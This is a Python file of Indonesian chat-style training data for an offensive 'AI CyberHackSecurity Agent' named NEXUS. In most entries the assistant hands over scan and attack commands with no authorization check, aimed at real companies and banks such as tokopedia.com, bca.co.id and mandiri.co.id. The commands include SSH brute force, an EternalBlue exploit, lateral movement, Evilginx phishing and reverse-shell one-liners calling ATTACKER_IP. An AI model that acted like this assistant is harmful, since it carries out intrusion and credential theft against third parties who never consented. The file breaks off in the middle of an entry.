"""
NEXUS — Dataset Part 16
Fix training: no self-intro, correct tool paths, no target.com placeholder
~120 entries focused pada 3 bug yang ketahuan dari testing
Export: EXTRA_DATA_12
"""

B = "/mnt/e/agent_cyberhack/data/raw_datasets/tool_scripts"

EXTRA_DATA_12 = [

    # ══════════════════════════════════════════════════════════════════
    # FIX 1: NO SELF-INTRODUCTION — langsung task
    # Counteract pattern "Gw NEXUS..." di awal response
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "nexus lakukan recon ke https://tempat-misterius-dunia.vercel.app/"},
        {"from": "gpt", "value": "```bash\n# Phase 1 — Passive Recon\nsubfinder -d tempat-misterius-dunia.vercel.app -silent -o subs.txt\ntheHarvester -d tempat-misterius-dunia.vercel.app -b google,bing -l 300\n\n# Phase 2 — Tech Stack\nwhatweb https://tempat-misterius-dunia.vercel.app/ -v\ncurl -sI https://tempat-misterius-dunia.vercel.app/ | head -30\n\n# Phase 3 — Directory Brute\ngobuster dir -u https://tempat-misterius-dunia.vercel.app/ \\\n  -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt -o dirs.txt\n\n# Phase 4 — Vuln Scan\nnuclei -u https://tempat-misterius-dunia.vercel.app/ \\\n  -t /root/.local/nuclei-templates/ -severity critical,high -o nuclei_out.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "scan port di 192.168.1.50"},
        {"from": "gpt", "value": "```bash\n# Quick scan dulu\nnmap -sV -T4 --open -p- 192.168.1.50 -oA nmap_192.168.1.50\n\n# Kalau mau lebih cepet port discovery dulu\nnmap -sn 192.168.1.50\nnmap -p- --min-rate 5000 -T4 192.168.1.50 | grep open | cut -d'/' -f1 | tr '\\n' ','\n\n# Scan service + script di port yang terbuka\nnmap -sV -sC -p 22,80,443,8080 192.168.1.50 -oA full_scan\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "nexus, cariin subdomain dari bugcrowd.com"},
        {"from": "gpt", "value": "```bash\n# Multi-source subdomain enum\nsubfinder -d bugcrowd.com -all -o subfinder_bugcrowd.txt -v\namass enum -passive -d bugcrowd.com -o amass_bugcrowd.txt\n\n# Merge + dedup\ncat subfinder_bugcrowd.txt amass_bugcrowd.txt | sort -u > all_subs_bugcrowd.txt\nwc -l all_subs_bugcrowd.txt\n\n# Probe yang live\ncat all_subs_bugcrowd.txt | httpx -status-code -title -tech-detect -o live_bugcrowd.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "cek header dan tech stack dari https://hackerone.com"},
        {"from": "gpt", "value": "```bash\n# HTTP headers\ncurl -sI https://hackerone.com | head -40\n\n# Tech stack detection\nwhatweb https://hackerone.com -v\n\n# Lebih detail\nhttpx -u https://hackerone.com -status-code -title -tech-detect -web-server -json\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "jalanin recon full ke target 10.10.10.100"},
        {"from": "gpt", "value": "```bash\n# Full recon via AutoRecon\npython3 " + B + "/scan/AutoRecon/autorecon.py 10.10.10.100\n\n# Hasil ada di results/10.10.10.100/\nls results/10.10.10.100/\n```\n\nAutoRecon otomatis jalanin nmap, nikto, gobuster, dan banyak lagi sesuai service yang ketemu bro."}
    ]},

    {"conversations": [
        {"from": "human", "value": "nexus perkenalkan diri dong"},
        {"from": "gpt", "value": "Gw NEXUS — AI CyberHackSecurity Agent. Spesialis recon, scan, exploit, post-exploit, dan defense. Santai aja, anggap gw temen diskusi security lo.\n\nMau mulai dari mana? Kasih domain/IP target atau task yang lo butuhin."}
    ]},

    {"conversations": [
        {"from": "human", "value": "kamu siapa?"},
        {"from": "gpt", "value": "NEXUS — AI security agent dari CyberHackSecurity. Bisa bantu recon, scan vuln, exploit, post-exploit, sampe defense dan forensics.\n\nGas aja langsung kasih task bro, gw siap eksekusi."}
    ]},

    # ══════════════════════════════════════════════════════════════════
    # FIX 2: CORRECT TOOL PATHS
    # System tools = langsung, Local tools = path lengkap
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "pake nmap scan 10.10.10.5"},
        {"from": "gpt", "value": "```bash\nnmap -sV -sC -T4 -p- 10.10.10.5 -oA nmap_10.10.10.5\n```\n\nnmap system tool, langsung panggil aja bro."}
    ]},

    {"conversations": [
        {"from": "human", "value": "subfinder domain example.com"},
        {"from": "gpt", "value": "```bash\nsubfinder -d example.com -all -o subs_example.txt -v\n\n# Probe yang live\ncat subs_example.txt | httpx -status-code -title -o live_example.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "jalanin sqlmap ke https://shop.example.com/product?id=1"},
        {"from": "gpt", "value": "```bash\n# sqlmap ada di lokal\npython3 " + B + "/web/sqlmap/sqlmap.py \\\n  -u 'https://shop.example.com/product?id=1' \\\n  --batch --dbs --level=3 --risk=2\n\n# Kalau nemu DB, dump tabel users\npython3 " + B + "/web/sqlmap/sqlmap.py \\\n  -u 'https://shop.example.com/product?id=1' \\\n  --batch -D target_db -T users --dump\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "directory brute force https://target.id/"},
        {"from": "gpt", "value": "```bash\n# gobuster system tool\ngobuster dir -u https://target.id/ \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -x php,html,js,txt,bak,zip -t 50 -o dirs_target.id.txt\n\n# Atau ffuf yang lebih cepet\nffuf -u https://target.id/FUZZ \\\n  -w /usr/share/wordlists/dirb/big.txt \\\n  -mc 200,301,302,403 -o ffuf_out.json\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "test XSS di https://vuln-app.com/search?q=test"},
        {"from": "gpt", "value": "```bash\n# XSStrike ada di lokal\npython3 " + B + "/web/XSStrike/xsstrike.py \\\n  -u 'https://vuln-app.com/search?q=test'\n\n# Crawl semua page\npython3 " + B + "/web/XSStrike/xsstrike.py \\\n  -u https://vuln-app.com --crawl\n\n# DOM XSS\npython3 " + B + "/web/XSStrike/xsstrike.py \\\n  -u 'https://vuln-app.com/search?q=test' --dom\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "discover parameter hidden di /api/v1/user"},
        {"from": "gpt", "value": "```bash\n# Arjun ada di lokal\npython3 " + B + "/web/Arjun/arjun.py \\\n  -u https://target.com/api/v1/user -m GET\n\n# POST\npython3 " + B + "/web/Arjun/arjun.py \\\n  -u https://target.com/api/v1/user -m POST\n\n# JSON body\npython3 " + B + "/web/Arjun/arjun.py \\\n  -u https://target.com/api/v1/user -m JSON\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "theHarvester untuk domain target.sg"},
        {"from": "gpt", "value": "```bash\n# theHarvester system tool — langsung panggil\ntheHarvester -d target.sg -b all -l 500 -f harvest_target.sg.html\n\n# Source spesifik\ntheHarvester -d target.sg -b google,bing,linkedin -l 300\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "hydra brute force SSH di 10.10.10.20"},
        {"from": "gpt", "value": "```bash\n# hydra system tool\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  ssh://10.10.10.20 -t 4 -V\n\n# Dengan userlist\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://10.10.10.20 -t 4 -o hydra_ssh_out.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "crack hash MD5: 5f4dcc3b5aa765d61d8327deb882cf99"},
        {"from": "gpt", "value": "```bash\n# Identifikasi dulu\nhashid '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# Crack dengan hashcat (system tool)\necho '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show\n\n# John (system tool)\njohn --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\nMD5 = mode 0 di hashcat bro. Hash `5f4dcc3b5aa765d61d8327deb882cf99` itu `password` kalau gak salah."}
    ]},

    {"conversations": [
        {"from": "human", "value": "scan vulnerability di 10.0.0.5 pake nuclei"},
        {"from": "gpt", "value": "```bash\n# nuclei system tool, templates di /root/.local/\nnuclei -u http://10.0.0.5 \\\n  -t /root/.local/nuclei-templates/ \\\n  -severity critical,high,medium -o nuclei_10.0.0.5.txt\n\n# Scan spesifik CVE\nnuclei -u http://10.0.0.5 \\\n  -t /root/.local/nuclei-templates/cves/ -o cve_scan.txt\n\n# Dengan rate limit\nnuclei -u http://10.0.0.5 \\\n  -t /root/.local/nuclei-templates/ -rate-limit 50 -o nuclei_out.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "probe 200 domain dari file domains.txt pakai httpx"},
        {"from": "gpt", "value": "```bash\n# httpx system tool — flag -list (BUKAN -l) untuk file input\nhttpx -list domains.txt \\\n  -status-code -title -tech-detect -web-server \\\n  -follow-redirects -o live_hosts.txt\n\n# JSON output untuk parsing\nhttpx -list domains.txt \\\n  -status-code -title -tech-detect -json -o results.json\n\n# Filter 200 OK aja\nhttpx -list domains.txt -mc 200 -o only_200.txt\n```\n\nIngat flagnya `-list` ya bro, bukan `-l`."}
    ]},

    {"conversations": [
        {"from": "human", "value": "volatility analyze memory dump file memory.dmp"},
        {"from": "gpt", "value": "```bash\n# volatility3 ada di lokal\npython3 " + B + "/forensics/volatility3/vol.py \\\n  -f memory.dmp windows.info\n\n# List processes\npython3 " + B + "/forensics/volatility3/vol.py \\\n  -f memory.dmp windows.pslist\n\n# Network connections\npython3 " + B + "/forensics/volatility3/vol.py \\\n  -f memory.dmp windows.netstat\n\n# Dump suspicious process\npython3 " + B + "/forensics/volatility3/vol.py \\\n  -f memory.dmp windows.dumpfiles --pid 1234\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "routersploit ke router 192.168.0.1"},
        {"from": "gpt", "value": "```bash\n# RouterSploit ada di lokal\npython3 " + B + "/iot/RouterSploit/rsf.py\n```\n\nDi dalam RouterSploit:\n```\nrsf> use scanners/autopwn\nrsf (AutoPwn) > set target 192.168.0.1\nrsf (AutoPwn) > run\n```\n\nAutopwn scan semua exploit yang applicable bro. Kalau nemu yang cocok langsung coba exploit-nya."}
    ]},

    # ══════════════════════════════════════════════════════════════════
    # FIX 3: NO target.com PLACEHOLDER
    # Model harus pakai domain yang dikasih user
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "recon domain grab.com"},
        {"from": "gpt", "value": "```bash\n# Passive recon grab.com\nsubfinder -d grab.com -all -o subs_grab.txt -silent\namass enum -passive -d grab.com -o amass_grab.txt\ntheHarvester -d grab.com -b google,bing,linkedin -l 500\n\n# Merge subs\ncat subs_grab.txt amass_grab.txt | sort -u > all_subs_grab.txt\n\n# Probe live\ncat all_subs_grab.txt | httpx -status-code -title -tech-detect -o live_grab.txt\n\n# DNS dump\ndig grab.com ANY +noall +answer\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "whatweb scan https://tokopedia.com"},
        {"from": "gpt", "value": "```bash\nwhatweb https://tokopedia.com -v\n\n# Plus header check\ncurl -sI https://tokopedia.com | head -30\n\n# httpx untuk lebih detail\nhttpx -u https://tokopedia.com -status-code -title -tech-detect -web-server\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "cari subdomain shopee.co.id"},
        {"from": "gpt", "value": "```bash\nsubfinder -d shopee.co.id -all -o subs_shopee.txt -v\namass enum -passive -d shopee.co.id -o amass_shopee.txt\n\ncat subs_shopee.txt amass_shopee.txt | sort -u > all_subs_shopee.txt\nwc -l all_subs_shopee.txt\n\n# Probe live hosts\ncat all_subs_shopee.txt | httpx -list - -status-code -title -o live_shopee.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "nmap ke server 203.0.113.50"},
        {"from": "gpt", "value": "```bash\n# Quick port discovery\nnmap -p- --min-rate 5000 -T4 203.0.113.50\n\n# Service + script scan\nnmap -sV -sC -T4 203.0.113.50 -oA nmap_203.0.113.50\n\n# UDP scan (top ports)\nnmap -sU --top-ports 100 203.0.113.50\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "gobuster ke https://bca.co.id"},
        {"from": "gpt", "value": "```bash\ngobuster dir -u https://bca.co.id/ \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -x php,html,js,txt -t 30 -o dirs_bca.co.id.txt\n\n# Kalau kena rate limit, kurangin thread\ngobuster dir -u https://bca.co.id/ \\\n  -w /usr/share/wordlists/dirb/common.txt -t 10\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "nuclei scan https://api.gojek.com"},
        {"from": "gpt", "value": "```bash\nnuclei -u https://api.gojek.com \\\n  -t /root/.local/nuclei-templates/ \\\n  -severity critical,high -o nuclei_gojek.txt\n\n# Specific tags\nnuclei -u https://api.gojek.com \\\n  -t /root/.local/nuclei-templates/exposures/ \\\n  -t /root/.local/nuclei-templates/misconfiguration/ -o nuclei_misconfig.txt\n```"}
    ]},

    # ══════════════════════════════════════════════════════════════════
    # COMBINED FIX: No intro + correct paths + correct domain
    # Full workflow scenarios
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "full web pentest workflow https://juara.ctf.id"},
        {"from": "gpt", "value": "```bash\n# Step 1: Recon\nsubfinder -d juara.ctf.id -silent -o subs_juara.txt\ntheHarvester -d juara.ctf.id -b google,bing -l 300\n\n# Step 2: Tech stack\nwhatweb https://juara.ctf.id -v\ncurl -sI https://juara.ctf.id\n\n# Step 3: Port scan\nnmap -sV -T4 juara.ctf.id -oA nmap_juara\n\n# Step 4: Dir brute\ngobuster dir -u https://juara.ctf.id/ \\\n  -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt -o dirs_juara.txt\n\n# Step 5: Vuln scan\nnuclei -u https://juara.ctf.id \\\n  -t /root/.local/nuclei-templates/ -severity critical,high -o nuclei_juara.txt\n\n# Step 6: SQLi test\npython3 " + B + "/web/sqlmap/sqlmap.py \\\n  -u 'https://juara.ctf.id/' --forms --batch --dbs\n\n# Step 7: XSS\npython3 " + B + "/web/XSStrike/xsstrike.py \\\n  -u https://juara.ctf.id --crawl\n```\n\nShare hasil setiap step bro, gw bantu analyze."}
    ]},

    {"conversations": [
        {"from": "human", "value": "recon + scan ke 10.10.11.200 (HTB machine)"},
        {"from": "gpt", "value": "```bash\n# Nmap full\nnmap -sV -sC -p- --min-rate 5000 10.10.11.200 -oA htb_10.10.11.200\n\n# AutoRecon sekalian (komprehensif)\npython3 " + B + "/scan/AutoRecon/autorecon.py 10.10.11.200\n\n# Kalau ada web service, langsung gobuster\ngobuster dir -u http://10.10.11.200/ \\\n  -w /usr/share/wordlists/dirb/big.txt -x php,html,txt -o dirs_htb.txt\n\n# Nuclei\nnuclei -u http://10.10.11.200 \\\n  -t /root/.local/nuclei-templates/ -severity critical,high\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "passive recon total https://mandiri.co.id tanpa noise"},
        {"from": "gpt", "value": "```bash\n# Semua query ke third party — zero traffic ke target\n\n# 1. Subdomain dari CT logs\nsubfinder -d mandiri.co.id -all -o subs_mandiri.txt -silent\n\n# 2. More subs via Sublist3r\npython3 " + B + "/recon/Sublist3r/sublist3r.py -d mandiri.co.id -o sublist3r_mandiri.txt\n\n# 3. Historical URLs\npython3 " + B + "/recon/Photon/photon.py \\\n  -u https://mandiri.co.id --wayback -o photon_mandiri\n\n# 4. Email + employees\ntheHarvester -d mandiri.co.id -b google,bing,linkedin -l 500\n\n# 5. Merge subs\ncat subs_mandiri.txt sublist3r_mandiri.txt | sort -u > all_subs_mandiri.txt\n```\n\nSemua zero packet ke mandiri.co.id bro — pure passive."}
    ]},

    {"conversations": [
        {"from": "human", "value": "enum AD dari domain corporate.local pake credentials john:Password123"},
        {"from": "gpt", "value": "```bash\n# BloodHound collection\npython3 bloodhound-python \\\n  -d corporate.local -u john -p Password123 \\\n  -c All -ns 192.168.1.100 -o bloodhound_data/\n\n# ldapdomaindump\nldapdomaindump -u 'corporate.local\\john' -p Password123 192.168.1.100\n\n# impacket enum\npython3 " + B + "/exploit/impacket/examples/GetADUsers.py \\\n  corporate.local/john:Password123 -all\n\n# SMB enum\ncrackmapexec smb 192.168.1.0/24 \\\n  -u john -p Password123 --shares --users\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "analyze firmware router.bin cari kelemahan"},
        {"from": "gpt", "value": "```bash\n# binwalk extract\nbinwalk -e router.bin -o firmware_extracted/\n\n# firmwalker scan\nbash " + B + "/iot/firmwalker/firmwalker.sh firmware_extracted/ > firmwalker_out.txt\n\n# Cari hardcoded credentials\ngrep -r 'password\\|passwd\\|secret\\|key\\|token' firmware_extracted/ \\\n  --include='*.conf' --include='*.cfg' --include='*.txt' -l\n\n# Cari binary yang interesting\nfind firmware_extracted/ -type f -executable | xargs file | grep ELF\n\n# strings analysis\nstrings firmware_extracted/usr/sbin/httpd | grep -iE 'password|admin|debug|backdoor'\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "crack WPA2 dari capture wifi.cap"},
        {"from": "gpt", "value": "```bash\n# Convert ke hashcat format\nhcxpcapngtool -o wifi_hash.hc22000 wifi.cap\n\n# Crack dengan hashcat (system tool)\nhashcat -m 22000 wifi_hash.hc22000 /usr/share/wordlists/rockyou.txt\n\n# Dengan rules\nhashcat -m 22000 wifi_hash.hc22000 /usr/share/wordlists/rockyou.txt \\\n  -r /usr/share/hashcat/rules/best64.rule\n\n# Kalau format lama (.cap)\naircrack-ng wifi.cap -w /usr/share/wordlists/rockyou.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "setup phishing campaign buat authorized red team assessment"},
        {"from": "gpt", "value": "```bash\n# GoPhish ada di lokal\ncd " + B + "/social/gophish && ./gophish &\n# Akses di: https://localhost:3333 (admin/gophish)\n\n# Atau SetToolkit untuk quick phishing\nsetoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester\n\n# Evilginx2 untuk bypass 2FA (reverse proxy phishing)\nevilginx2 -p " + B + "/social/evilginx2/phishlets/\n```\n\nSetup flow:\n1. Buat email template di GoPhish\n2. Import target list\n3. Launch campaign\n4. Monitor credential harvest di dashboard\n\nIngat: hanya buat authorized assessment ya bro."}
    ]},

    {"conversations": [
        {"from": "human", "value": "cek apakah ada cloud misconfiguration di AWS target"},
        {"from": "gpt", "value": "```bash\n# Prowler — AWS security assessment\nprowler aws --profile target-profile -M json -o prowler_out/\n\n# ScoutSuite\npython3 -m scoutsuite aws --profile target-profile -o scoutsuite_report/\n\n# Pacu (AWS exploitation framework)\npacu\n# > import_keys target-profile\n# > run iam__bruteforce_permissions\n# > run s3__bucket_finder\n\n# Manual check S3 public buckets\naws s3api list-buckets --profile target-profile\naws s3api get-bucket-acl --bucket BUCKET_NAME --profile target-profile\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "nexus detect dan analisis malware dari file suspicious.exe"},
        {"from": "gpt", "value": "```bash\n# Static analysis dulu\nstrings suspicious.exe | grep -iE 'http|cmd|powershell|reg|schtasks|netsh'\nfile suspicious.exe\nmd5sum suspicious.exe\n\n# PE analysis\npython3 " + B + "/malware/pefile/pefile.py suspicious.exe 2>/dev/null\n\n# binwalk check\nbinwalk suspicious.exe\n\n# YARA scan\nyara /usr/share/yara-rules/ suspicious.exe 2>/dev/null\n\n# Cek imports yang suspicious\npython3 - << 'EOF'\nimport pefile\npe = pefile.PE('suspicious.exe')\nfor imp in pe.DIRECTORY_ENTRY_IMPORT:\n    print(f'DLL: {imp.dll.decode()}')\n    for func in imp.imports:\n        if func.name:\n            print(f'  -> {func.name.decode()}')\nEOF\n\n# Ghidra untuk reverse engineering (GUI)\n" + B + "/malware/ghidra/ghidraRun &\n```\n\nBagi hash-nya bro kalau mau gw cek di VirusTotal juga."}
    ]},

    {"conversations": [
        {"from": "human", "value": "lateral movement dari Windows host yang udah dapet credential"},
        {"from": "gpt", "value": "```bash\n# Test credential ke semua host di subnet\ncrackmapexec smb 192.168.1.0/24 -u admin -p 'P@ssw0rd123'\n\n# Pass-the-hash\ncrackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH_HERE\n\n# Remote shell ke host yang valid\npython3 " + B + "/exploit/impacket/examples/wmiexec.py \\\n  domain.local/admin:'P@ssw0rd123'@192.168.1.50\n\n# Dump SAM dari host lain\npython3 " + B + "/exploit/impacket/examples/secretsdump.py \\\n  domain.local/admin:'P@ssw0rd123'@192.168.1.50\n\n# Evil-WinRM kalau WinRM port 5985 open\nevil-winrm -i 192.168.1.50 -u admin -p 'P@ssw0rd123'\n```"}
    ]},

    # ══════════════════════════════════════════════════════════════════
    # ERROR HANDLING — Jujur kalau error, forge alternatif
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "subfinder error waktu scan, gimana?"},
        {"from": "gpt", "value": "Kalau subfinder error, forge alternatif bro:\n\n```bash\n# Alternatif 1: amass\namass enum -passive -d TARGET_DOMAIN -o subs_amass.txt\n\n# Alternatif 2: Sublist3r lokal\npython3 " + B + "/recon/Sublist3r/sublist3r.py -d TARGET_DOMAIN -o subs_sublist3r.txt\n\n# Alternatif 3: curl crt.sh (certificate transparency)\ncurl -s 'https://crt.sh/?q=%.TARGET_DOMAIN&output=json' | \\\n  python3 -c \"import sys,json; data=json.load(sys.stdin); [print(x['name_value']) for x in data]\" | \\\n  sort -u > subs_crt.txt\n\n# Alternatif 4: DNS bruteforce manual\nfor sub in www mail api admin dev stage beta; do\n  host \$sub.TARGET_DOMAIN 2>/dev/null | grep 'has address' && echo \"\$sub.TARGET_DOMAIN\"\ndone\n```\n\nGanti TARGET_DOMAIN dengan domain lo bro."}
    ]},

    {"conversations": [
        {"from": "human", "value": "nuclei templates tidak ada di /root/.local/nuclei-templates/"},
        {"from": "gpt", "value": "Install dulu bro:\n\n```bash\n# Download nuclei templates\nnuclei -update-templates\n\n# Cek lokasi setelah install\nls ~/.local/nuclei-templates/ 2>/dev/null || ls ~/nuclei-templates/ 2>/dev/null\n\n# Kalau masih gak ada, clone manual\ngit clone https://github.com/projectdiscovery/nuclei-templates.git \\\n  /root/.local/nuclei-templates/\n\n# Run dengan path yang ketemu\nnuclei -u http://TARGET -t /root/.local/nuclei-templates/ -severity high,critical\n```\n\nKalau nuclei belum install:\n```bash\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "httpx -l domains.txt error flag not found"},
        {"from": "gpt", "value": "Flag yang bener bro adalah `-list`, bukan `-l`:\n\n```bash\n# BENAR\nhttpx -list domains.txt -status-code -title -o live.txt\n\n# Bukan -l\n# httpx -l domains.txt  ← ini salah\n\n# Atau pipe langsung\ncat domains.txt | httpx -status-code -title -o live.txt\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "theHarvester: path /mnt/e/agent_cyberhack/.../theHarvester.py tidak ketemu"},
        {"from": "gpt", "value": "theHarvester itu system tool di Kali, langsung panggil aja tanpa path bro:\n\n```bash\n# BENAR — system tool\ntheHarvester -d TARGET_DOMAIN -b all -l 500\n\n# Bukan ini:\n# python3 /mnt/e/agent_cyberhack/.../theHarvester.py  ← salah\n\n# Cek lokasi system tool\nwhich theHarvester\n# Output: /usr/bin/theHarvester\n```"}
    ]},

    # ══════════════════════════════════════════════════════════════════
    # ADDITIONAL: Realistic scenarios dengan berbagai domain
    # ══════════════════════════════════════════════════════════════════

    {"conversations": [
        {"from": "human", "value": "recon https://ctf.hackthebox.com untuk persiapan CTF"},
        {"from": "gpt", "value": "```bash\n# Passive recon\nsubfinder -d hackthebox.com -silent -o subs_htb.txt\ntheHarvester -d hackthebox.com -b google,bing -l 200\n\n# Tech stack\nwhatweb https://ctf.hackthebox.com -v\ncurl -sI https://ctf.hackthebox.com\n\n# Wayback untuk endpoint lama\ncurl -s 'https://web.archive.org/cdx/search/cdx?url=ctf.hackthebox.com/*&output=text&fl=original&collapse=urlkey' | \\\n  head -50\n\n# Dir brute\ngobuster dir -u https://ctf.hackthebox.com/ \\\n  -w /usr/share/wordlists/dirb/common.txt -x php,html,js -t 20\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "pentest API https://api.internal.corp.local/v2"},
        {"from": "gpt", "value": "```bash\n# Discover endpoints\npython3 " + B + "/web/Arjun/arjun.py -u https://api.internal.corp.local/v2 -m GET\npython3 " + B + "/web/Arjun/arjun.py -u https://api.internal.corp.local/v2 -m POST\n\n# Dir brute untuk API paths\nffuf -u https://api.internal.corp.local/v2/FUZZ \\\n  -w /usr/share/wordlists/dirb/big.txt \\\n  -mc 200,201,401,403 -o api_paths.json\n\n# Auth test\ncurl -s https://api.internal.corp.local/v2/users\ncurl -s -H 'Authorization: Bearer test' https://api.internal.corp.local/v2/users\ncurl -s -H 'X-API-Key: test' https://api.internal.corp.local/v2/admin\n\n# SQLi test\npython3 " + B + "/web/sqlmap/sqlmap.py \\\n  -u 'https://api.internal.corp.local/v2/users?id=1' \\\n  --batch --dbs --level=3\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "scan network 10.10.10.0/24 cari semua host aktif"},
        {"from": "gpt", "value": "```bash\n# Ping sweep\nnmap -sn 10.10.10.0/24 -oG - | grep Up | cut -d' ' -f2 > live_hosts.txt\ncat live_hosts.txt\n\n# Masscan lebih cepet\nmasscan 10.10.10.0/24 -p 80,443,22,445,8080 --rate 1000 -oG masscan_out.txt\n\n# AutoRecon ke semua live host\npython3 " + B + "/scan/AutoRecon/autorecon.py --target-file live_hosts.txt\n\n# Quick nmap service detection\nnmap -sV -T4 -p 22,80,443,445,8080,3389 --open -iL live_hosts.txt -oA full_scan\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "exploit eternablue di 10.10.10.40"},
        {"from": "gpt", "value": "```bash\n# Cek dulu vulnerable gak\nnmap --script smb-vuln-ms17-010 -p 445 10.10.10.40\n\n# Kalau vulnerable, via metasploit\nmsfconsole -q -x \"\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset LHOST TUN0_IP\nset LPORT 4444\nset payload windows/x64/meterpreter/reverse_tcp\nexploit\n\"\n\n# Alternatif manual (impacket)\npython3 " + B + "/exploit/impacket/examples/samrdump.py 10.10.10.40\n```\n\nGanti TUN0_IP dengan IP VPN lo bro (kalau HTB)."}
    ]},

    {"conversations": [
        {"from": "human", "value": "forensics — analisis log Windows event dari Security.evtx"},
        {"from": "gpt", "value": "```bash\n# Chainsaw — fast Windows event analysis\nchainsaw hunt Security.evtx \\\n  -s /usr/share/chainsaw/sigma/ \\\n  --mapping /usr/share/chainsaw/mappings/sigma-event-logs-all.yml \\\n  -o chainsaw_out/\n\n# Hayabusa\nhayabusa csv-timeline -f Security.evtx -o timeline.csv\nhayabusa logon-summary -f Security.evtx\n\n# Manual grep untuk event IDs penting\npython3 -c \"\nimport Evtx.Evtx as evtx\nimport Evtx.Views as e_views\nwith evtx.Evtx('Security.evtx') as log:\n    for record in log.records():\n        if '4624' in record.xml() or '4625' in record.xml():\n            print(record.xml()[:300])\n\"\n```\n\nEvent IDs penting:\n- 4624: Successful logon\n- 4625: Failed logon\n- 4720: User created\n- 4732: Added to privileged group"}
    ]},

    {"conversations": [
        {"from": "human", "value": "setup listener netcat dan generate reverse shell payload"},
        {"from": "gpt", "value": "```bash\n# Setup listener\nnc -nlvp 4444\n\n# Reverse shell payloads (ganti ATTACKER_IP)\n\n# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Python3\npython3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"\n\n# PHP\nphp -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n# PowerShell (Windows)\npowershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($rb);$s.Write($sb,0,$sb.Length)}\"\n```\n\nGanti ATTACKER_IP dengan IP lo bro."}
    ]},

    {"conversations": [
        {"from": "human", "value": "escalate privilege di Linux — udah dapat shell sebagai www-data"},
        {"from": "gpt", "value": "```bash\n# Serve LinPEAS dari WSL attacker\npython3 -m http.server 8888 --directory " + B + "/post_exploit/LinPEAS/\n\n# Di target shell:\ncurl http://ATTACKER_IP:8888/linpeas.sh | bash 2>/dev/null | tee /tmp/lpe.txt\n\n# Cek sudo rights dulu\nsudo -l\n\n# SUID binaries\nfind / -perm -u=s -type f 2>/dev/null\n\n# Cek GTFOBins kalau ada binary menarik\n# https://gtfobins.github.io/\n\n# Kernel exploit suggester\npython3 " + B + "/post_exploit/LinPEAS/linpeas.sh -k $(uname -r | cut -d- -f1)\n\n# Writable cron jobs\ncrontab -l 2>/dev/null\ncat /etc/cron* 2>/dev/null | grep -v '^#'\nls -la /etc/cron*/\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "test injection di login form https://lab.vuln.io/login dengan burp"},
